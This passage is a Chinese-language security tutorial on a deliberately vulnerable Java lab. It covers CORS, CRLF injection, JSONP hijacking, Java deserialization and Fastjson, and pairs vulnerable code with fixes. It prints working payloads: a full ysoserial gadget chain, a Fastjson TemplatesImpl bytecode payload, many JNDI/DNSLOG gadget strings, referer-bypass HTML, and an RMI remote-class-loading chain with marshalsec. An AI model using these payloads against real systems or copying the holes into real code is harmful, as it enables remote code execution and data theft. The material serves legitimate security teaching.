request.getHeader(&quot;origin&quot;); response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); // allow cookie return info;}@GetMapping(&quot;/vuln/setHeader&quot;)public String vuls2(HttpServletResponse response) { // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常 response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); return info;} 设置HTTP头，然后直接返回信息 修复方式如下： /** * 重写Cors的checkOrigin校验方法 * 支持自定义checkOrigin，让其额外支持一级域名 * 代码：org/joychou/security/CustomCorsProcessor */ @CrossOrigin(origins = {&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;}) @GetMapping(&quot;/sec/crossOrigin&quot;) public String secCrossOrigin() { return info; } /** * WebMvcConfigurer设置Cors * 支持自定义checkOrigin * 代码：org/joychou/config/CorsConfig.java */ @GetMapping(&quot;/sec/webMvcConfigurer&quot;) public CsrfToken getCsrfToken_01(CsrfToken token) { return token; } /** * spring security设置cors * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行 * 代码：org/joychou/security/WebSecurityConfig.java */ @GetMapping(&quot;/sec/httpCors&quot;) public CsrfToken getCsrfToken_02(CsrfToken token) { return token; } /** * 自定义filter设置cors * 支持自定义checkOrigin * 代码：org/joychou/filter/OriginFilter.java */ @GetMapping(&quot;/sec/originFilter&quot;) public CsrfToken getCsrfToken_03(CsrfToken token) { return token; } /** * CorsFilter设置cors。 * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行 * 代码：org/joychou/filter/BaseCorsFilter.java */ @RequestMapping(&quot;/sec/corsFilter&quot;) public CsrfToken getCsrfToken_04(CsrfToken token) { return token; } @GetMapping(&quot;/sec/checkOrigin&quot;) public String seccode(HttpServletRequest request, HttpServletResponse response) { String origin = request.getHeader(&quot;Origin&quot;); // 如果origin不为空并且origin不在白名单内，认定为不安全。 // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。 if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) { return &quot;Origin is not safe.&quot;; } response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); return LoginUtils.getUserInfo2JsonStr(request); } Cors和CSRF的区别 5.CRLFInjection​ RLF是”回车+换行”(\\r\\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。 ?url=http://baidu.com/xxx%0a%0dSet-Cookie: test123=123 // 恶意添加修改信息 ​ 关于实战，这里有几个案例，可以学习一波。 CRLF注入 Bottle HTTP 头注入漏洞探究 案例 但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。 核心代码如下： @RequestMapping(&quot;/crlf&quot;)public class CRLFInjection { @RequestMapping(&quot;/safecode&quot;) @ResponseBody public void crlf(HttpServletRequest request, HttpServletResponse response) { response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;)); response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;)); String author = request.getParameter(&quot;test3&quot;); Cookie cookie = new Cookie(&quot;test3&quot;, author); response.addCookie(cookie); }} 访问http://localhost:8080/java_sec_code_war/crlf/safecode ?test1=111%0d%0ax&amp;test2=111%0d%0a111 6.JsonpJSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。 举例说明如下： 在 jQuery 中，可以通过使用JSONP 形式的回调函数来加载其他网域的JSON数据，如 &quot;myurl?callback=?&quot;。jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 jQuery 会把？注册成window.? 的系统函数，然后映射调用。一般用于跨域ajax请求，提供URL的一方会返回一个callback函数的JSON数据，然后回调时就能获取了。 请求的URL例子：&quot;myurl?callback=123123123&quot; //这个123123就是?号，jquery自动生成的。返回的数据例子：123123123({“id”:&quot;1&quot;,&quot;name&quot;:&quot;张三&quot;}) 核心代码如下： @ControllerAdvicepublic class JSONPAdvice extends AbstractJsonpResponseBodyAdvice { public JSONPAdvice() { super(&quot;callback&quot;, &quot;cback&quot;); // callback的参数名，可以为多个 }} 当有接口返回了Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入callback=test或cback=test就会自动变成JSONP接口。比如下面代码： @RequestMapping(value = &quot;/advice&quot;, produces = MediaType.APPLICATION_JSON_VALUE)public JSONObject advice() { String info = &quot;{\\&quot;name\\&quot;: \\&quot;JoyChou\\&quot;, \\&quot;phone\\&quot;: \\&quot;18200001111\\&quot;}&quot;; return JSON.parseObject(info);} 虽然上面代码指定了response的content-type为application/json，但是在AbstractJsonpResponseBodyAdvice类中会设置为application/javascript，提供给前端调用。 设置content-type为application/javascript的代码： protected MediaType getContentType(MediaType contentType, ServerHttpRequest request, ServerHttpResponse response) { return new MediaType(&quot;application&quot;, &quot;javascript&quot;);} 并且还会判断callback的参数只是否是有效的，代码如下： private static final Pattern CALLBACK_PARAM_PATTERN = Pattern.compile(&quot;[0-9A-Za-z_\\\\.]*&quot;);protected boolean isValidJsonpQueryParam(String value) { return CALLBACK_PARAM_PATTERN.matcher(value).matches();} 安全问题： 使用AbstractJsonpResponseBodyAdvice能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用AbstractJsonpResponseBodyAdvice，需要默认校验所有jsonp接口的referer是否合法。 PS： 在Spring Framework 5.1，移除了AbstractJsonpResponseBodyAdvice类。Springboot 2.1.0 RELEASE默认使用spring framework版本5.1.2版本。也就是在SpringBoot 2.1.0 RELEASE及以后版本都不能使用该功能，用CORS替代。 https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html Will be removed as of Spring Framework 5.1, use CORS instead. 1.前端调用代码的 使用ajax的jsonp调用方式，运行后会弹框JoyChou。 使用script src方式，运行后会弹框JoyChou。 使用ajax的jsonp调用方式代码： &lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot; /&gt;&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=&quot;JavaScript&quot;&gt;$(document).ready(function() { $.ajax({ url:'http://localhost:8080/jsonp/advice', dataType:'jsonp', success:function(data){ alert(data.name) } });});&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; script src方式代码： &lt;html&gt;&lt;script&gt; function aaa(data){ alert(JSON.stringify(data)); }&lt;/script&gt;&lt;script src=http://172.20.10.6:8080/java_sec_code_war/jsonp/vuln/referer?callback_=aaa&gt;&lt;/script&gt;&lt;/html&gt; script src方法 测试如下： 2.空Referer绕过有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。 核心代码： @RequestMapping(value = &quot;/vuln/emptyReferer&quot;, produces = &quot;application/javascript&quot;)public String emptyReferer(HttpServletRequest request) { String referer = request.getHeader(&quot;referer&quot;); if (null != referer &amp;&amp; SecurityUtil.checkURL(referer) == null) { return &quot;error&quot;; } String callback = request.getParameter(this.callback); return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));} 增加了对referer的检测我们可以使用如下方法进行绕过 1.添加no-referrer 参数&lt;html&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; //no-referrer&lt;script&gt; function test(data){ alert(JSON.stringify(data)); }&lt;/script&gt;&lt;script src=http://172.20.10.6:8080/java_sec_code_war/jsonp/vuln/emptyReferer?callback_=test&gt;&lt;/script&gt;&lt;/html&gt; 2.使用iframe标签进行绕过&lt;html&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&lt;iframe src=&quot;javascript:'&lt;script&gt;function test(data){alert(JSON.stringify(data));}&lt;/script&gt;&lt;script src=http://172.20.10.6:8080/java_sec_code_war/jsonp/vuln/emptyReferer?callback_=test&gt;&lt;/script&gt;'&quot;&gt;&lt;/iframe&gt;&lt;/html&gt; 测试如下： 修复代码： @RequestMapping(value = &quot;/sec/checkReferer&quot;, produces = &quot;application/javascript&quot;)public String safecode(HttpServletRequest request) { String referer = request.getHeader(&quot;referer&quot;); if (SecurityUtil.checkURL(referer) == null) { return &quot;error&quot;; } String callback = request.getParameter(this.callback); return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));} 不管referer是否为null都进行判断 3.fastjsonp to jsonp核心代码如下 @GetMapping(value = &quot;/fastjsonp/getToken&quot;, produces = &quot;application/javascript&quot;)public String getCsrfToken2(HttpServletRequest request) { CsrfToken csrfToken = cookieCsrfTokenRepository.loadToken(request); // get csrf token String callback = request.getParameter(&quot;fastjsonpCallback&quot;); if (StringUtils.isNotBlank(callback)) { JSONPObject jsonpObj = new JSONPObject(callback); jsonpObj.addParameter(csrfToken); return jsonpObj.toString(); } else { return csrfToken.toString(); }} 测试如下： 7.Deserialize 序列化与反序列化​ Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。 核心代码： /** * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64 * Add the result to rememberMe cookie. * &lt;p&gt; * http://localhost:8080/deserialize/rememberMe/vuln */ @RequestMapping(&quot;/rememberMe/vuln&quot;) public String rememberMeVul(HttpServletRequest request) throws IOException, ClassNotFoundException { Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return &quot;No rememberMe cookie. Right?&quot;; } String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); ObjectInputStream in = new ObjectInputStream(bytes); in.readObject(); in.close(); return &quot;Are u ok?&quot;; } 代码相对来说也比较简单使用Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。 利用方式如下： 使用ysoserial.jar生成payload ╰─$ java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg= 访问页面 http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln 修复代码： @RequestMapping(&quot;/rememberMe/security&quot;)public String rememberMeBlackClassCheck(HttpServletRequest request) throws IOException, ClassNotFoundException { Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return &quot;No rememberMe cookie. Right?&quot;; } String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); try { AntObjectInputStream in = new AntObjectInputStream(bytes); // throw InvalidClassException in.readObject(); in.close(); } catch (InvalidClassException e) { logger.info(e.toString()); return e.toString(); } return &quot;I'm very OK.&quot;;} 修复方式是通过Hook resolveClass来校验反序列化的类 序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出《Look-ahead Java deserialization》 跟入后对应代码如下： /** * 只允许反序列化SerialObject class * * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。 * 类似fastjson通用类的反序列化就不能校验。 * 但是RASP是通过HOOK java/io/ObjectInputStream类的resolveClass方法，全局的检测白名单。 * */@Overrideprotected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc) throws IOException, ClassNotFoundException{ String className = desc.getName(); // Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject logger.info(&quot;Deserialize class name: &quot; + className); String[] denyClasses = {&quot;java.net.InetAddress&quot;, &quot;org.apache.commons.collections.Transformer&quot;, &quot;org.apache.commons.collections.functors&quot;}; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className); } } return super.resolveClass(desc);} 如果还是不太明白，可以参考： 浅谈Java反序列化漏洞修复方案 Java反序列化过程深究 8.FastjsonFastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。 漏洞被利用本质找到一条有效的攻击链，攻击链的末端就是有代码执行能力的类，来达到我们想做的事情，一般都是用来RCE（远程命令执行）。构造一个触发器，也就是通过什么方式来让攻击链执行你想要的代码。触发器可以通过很多方式，比如静态代码块、构造方法等等。 Fastjson反序列化漏洞被利用的原因，可以归结为两方面： Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。攻击者可以构造恶意请求，使目标应用的代码执行流程进入这部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带来不断升级版本的困扰。 对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法： parse (String text) parseObject(String text) parseObject(String text, Class clazz) 无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。 核心代码： @RequestMapping(value = &quot;/deserialize&quot;, method = {RequestMethod.POST}) @ResponseBody public String Deserialize(@RequestBody String params) { // 如果Content-Type不设置application/json格式，post数据会被url编码 try { // 将post提交的string转换为json JSONObject ob = JSON.parseObject(params); return ob.get(&quot;name&quot;).toString(); } catch (Exception e) { return e.toString(); } } public static void main(String[] args) { // Open calc in mac String payload = &quot;{\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;, \\&quot;_bytecodes\\&quot;: [\\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\\&quot;], \\&quot;_name\\&quot;: \\&quot;lightless\\&quot;, \\&quot;_tfactory\\&quot;: { }, \\&quot;_outputProperties\\&quot;:{ }}&quot;; JSON.parseObject(payload, Feature.SupportNonPublicField); }} 使用parseObject 来解析json字符串 用POST方法打开，Content-Type设置为application/json，暴露使用的fastjson: 使用DNSLOG验证{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;name&quot;:{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}]Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:0{&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://dnslog/&quot;], &quot;Realms&quot;:[&quot;&quot;]}{&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;asText&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: {&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: {&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://dnslog/&quot;}, &quot;namespace&quot;:&quot;&quot;}{&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://dnslog/&quot;, &quot;autoCommit&quot;:true}{&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;rmi://dnslog/&quot;}{&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://dnslog/&quot;,&quot;Object&quot;:&quot;a&quot;}{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://dnslog/&quot;}{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;rmi://dnslog/&quot;}{&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;rmi://dnslog/&quot;} 任意命令执行// TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } 编译代码,上传至服务器，我在本地使用Python http.server 进行搭建 javac TouchFile.java //进行编译python3 -m http.server 4444 //简单搭建web服务 借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class。 ╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.8.103/#TouchFile 9999 在显示监听后，在客户端发送请求payload，主要看创建文件是否成功 { &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.169.8.103:9999/TouchFile&quot;, &quot;autoCommit&quot;:true }} 发现已经访问 ╰─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.8.103:4444/#TouchFile 9999* Opening JRMP listener on 9999Have connection from /192.168.8.103:54177Reading message...Is RMI.lookup call for TouchFile 2Sending remote classloading stub targeting http://192.168.8.103:4444/TouchFile.classClosing connection╰─$ python3 -m http.server 4444Serving HTTP on :: port 4444 